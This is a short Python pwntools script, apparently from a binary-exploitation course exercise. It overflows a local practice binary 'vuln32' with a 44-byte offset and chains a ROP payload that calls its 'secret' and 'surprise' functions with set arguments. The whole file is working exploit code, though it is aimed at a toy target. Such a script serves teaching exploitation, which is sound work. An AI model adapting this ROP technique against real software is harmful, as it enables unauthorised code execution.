from pwn import *
from pwn import p32
import sys
 
context.log_level = 'info'
 
BIN_name = "./vuln32"
context.binary = BIN_name
 
#you can use this to extract addresses of the functions
e = ELF(BIN_name)
secret_addr = e.symbols['secret']
surprise_addr = e.symbols['surprise']
 
print('secret: 0x{:08x}'.format(secret_addr))
print('surprise: 0x{:08x}'.format(surprise_addr))
 
offset = 44  # sizeof(buf) + sizeof(ebp) == 32 + ?*8 + 4  offset is on the house today :)
pop_ret_gadget = 0x08049022  # : pop ebx ; ret # gadget 
arg1 = 0x87654321 # for surprise 
arg2 = 0x12345678 # for secret
 
#ex a piece of chain:     p32(secret_addr) + p32(pop_ret_gadget) + p32(arg1)
 
payload = b"A" * offset + p32(secret_addr) + p32(pop_ret_gadget) + p32(arg2) \
                        + p32(surprise_addr) + p32(pop_ret_gadget) + p32(arg1)
 
print(len(payload))
print(payload)
sys.stdout.buffer.write(payload)
 
io = process(BIN_name)
 
# gdb.attach(io)
 
io.sendline(payload)
 
# a = io.recvline()
# print(a)
 
io.interactive()